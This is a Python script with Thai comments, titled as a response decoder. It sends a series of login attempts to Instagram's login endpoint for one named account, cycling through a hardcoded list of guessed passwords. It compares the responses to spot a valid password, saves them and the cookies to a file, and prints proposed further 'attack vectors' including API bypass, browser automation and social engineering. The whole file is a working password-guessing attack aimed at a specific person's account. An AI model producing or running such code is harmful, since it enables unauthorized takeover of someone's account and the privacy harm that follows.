#!/usr/bin/env python3
"""
INSTAGRAM RESPONSE DECODER
วิเคราะห์การตอบกลับของ Instagram แบบละเอียด
เพื่อเข้าใจว่าเกิดอะไรขึ้นกับการเปลี่ยนแปลงของระบบ
"""

import requests
import json
import time
from datetime import datetime

class ResponseDecoder:
    def __init__(self):
        self.session = requests.Session()
        self.csrf_token = None
        
    def setup_session(self):
        """เตรียม session"""
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive'
        })
        
        response = self.session.get('https://www.instagram.com/')
        
        if 'csrftoken' in self.session.cookies:
            self.csrf_token = self.session.cookies['csrftoken']
            return True
        return False
    
    def decode_login_response(self, username, password):
        """ถอดรหัสการตอบกลับจาก login"""
        print(f"\n🔍 DECODING RESPONSE: {username}:{password}")
        print("=" * 50)
        
        login_data = {
            'username': username,
            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{password}',
            'queryParams': '{}',
            'optIntoOneTap': 'false'
        }
        
        headers = {
            'X-CSRFToken': self.csrf_token,
            'X-Instagram-AJAX': '1',
            'X-IG-App-ID': '936619743392459',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Referer': 'https://www.instagram.com/accounts/login/'
        }
        
        response = self.session.post(
            'https://www.instagram.com/accounts/login/ajax/',
            data=login_data,
            headers=headers
        )
        
        print(f"📊 Status Code: {response.status_code}")
        print(f"📏 Response Length: {len(response.text)} characters")
        
        # แสดง headers
        print(f"\n📋 RESPONSE HEADERS:")
        for key, value in response.headers.items():
            print(f"   {key}: {value}")
        
        # แสดง cookies
        print(f"\n🍪 COOKIES:")
        for name, value in self.session.cookies.items():
            print(f"   {name}: {value}")
        
        # วิเคราะห์เนื้อหา
        print(f"\n📝 RAW RESPONSE:")
        print(f"'{response.text}'")
        
        try:
            json_data = response.json()
            print(f"\n📊 JSON STRUCTURE:")
            print(json.dumps(json_data, indent=2))
            
            # วิเคราะห์แต่ละ field
            print(f"\n🔬 DETAILED ANALYSIS:")
            for key, value in json_data.items():
                print(f"   {key}: {value} (type: {type(value).__name__})")
                
                # วิเคราะห์เพิ่มเติม
                if key == 'authenticated':
                    if value == False:
                        print(f"      ❌ Login failed - wrong password")
                    elif value == True:
                        print(f"      ✅ Login successful!")
                        
                elif key == 'user':
                    if value == False:
                        print(f"      ❌ User not found or invalid")
                    elif isinstance(value, dict):
                        print(f"      ✅ User data returned")
                        
                elif key == 'status':
                    if value == 'fail':
                        print(f"      ❌ Request failed")
                    elif value == 'ok':
                        print(f"      ✅ Request successful")
            
            return json_data
            
        except json.JSONDecodeError:
            print(f"\n❌ Non-JSON response")
            return None
    
    def compare_responses(self):
        """เปรียบเทียบการตอบกลับของรหัสผ่านต่างๆ"""
        passwords = ["Fleming654", "Fleming786", "Fleming1004", "Fleming1060", "Fleming1182", "Fleming1998"]
        username = "alx.trading"
        
        print(f"🔬 RESPONSE COMPARISON ANALYSIS")
        print(f"Target: {username}")
        print("=" * 60)
        
        if not self.setup_session():
            print("❌ Failed to setup session")
            return
        
        print(f"✅ CSRF Token: {self.csrf_token[:20]}...")
        
        all_responses = []
        
        for i, password in enumerate(passwords, 1):
            print(f"\n{'='*60}")
            print(f"RESPONSE ANALYSIS {i}/{len(passwords)}")
            print(f"{'='*60}")
            
            response_data = self.decode_login_response(username, password)
            
            analysis = {
                'password': password,
                'response': response_data,
                'timestamp': datetime.now().isoformat()
            }
            
            all_responses.append(analysis)
            
            # รอระหว่างการทดสอบ
            if i < len(passwords):
                print(f"\n⏳ Waiting 3s before next test...")
                time.sleep(3)
        
        # บันทึกผลลัพธ์
        filename = f"response_comparison_{int(time.time())}.json"
        with open(filename, 'w') as f:
            json.dump(all_responses, f, indent=2)
        
        print(f"\n💾 Comparison saved to: {filename}")
        
        # สรุปการเปรียบเทียบ
        self.summarize_comparison(all_responses)
    
    def summarize_comparison(self, responses):
        """สรุปการเปรียบเทียบ"""
        print(f"\n📊 COMPARISON SUMMARY")
        print("=" * 40)
        
        # วิเคราะห์รูปแบบการตอบกลับ
        patterns = {}
        
        for resp in responses:
            password = resp['password']
            data = resp['response']
            
            if data:
                # สร้าง pattern key
                pattern_key = f"auth:{data.get('authenticated')}_user:{data.get('user')}_status:{data.get('status')}"
                
                if pattern_key not in patterns:
                    patterns[pattern_key] = []
                
                patterns[pattern_key].append(password)
        
        print(f"🔍 RESPONSE PATTERNS:")
        for pattern, passwords in patterns.items():
            print(f"   Pattern: {pattern}")
            print(f"   Passwords: {', '.join(passwords)}")
            print()
        
        # วิเคราะห์ความแตกต่าง
        if len(patterns) == 1:
            print(f"📌 FINDING: All passwords show identical response pattern")
            print(f"   This suggests:")
            print(f"   - Instagram may have changed their response system")
            print(f"   - Security measures may have been enhanced")
            print(f"   - Need different attack approach")
        else:
            print(f"📌 FINDING: Different response patterns detected")
            print(f"   This suggests some passwords may be valid")
        
        # แนะนำขั้นตอนต่อไป
        print(f"\n💡 NEXT STEPS:")
        print(f"   1. Instagram seems to have updated their security")
        print(f"   2. 'checkpoint_required' responses are no longer appearing")
        print(f"   3. Need to try different attack vectors:")
        print(f"      - API endpoints bypass")
        print(f"      - Mobile app simulation") 
        print(f"      - Browser automation")
        print(f"      - Social engineering approaches")

def main():
    print("🔍 INSTAGRAM RESPONSE DECODER")
    print("=" * 50)
    
    decoder = ResponseDecoder()
    decoder.compare_responses()

if __name__ == "__main__":
    main()
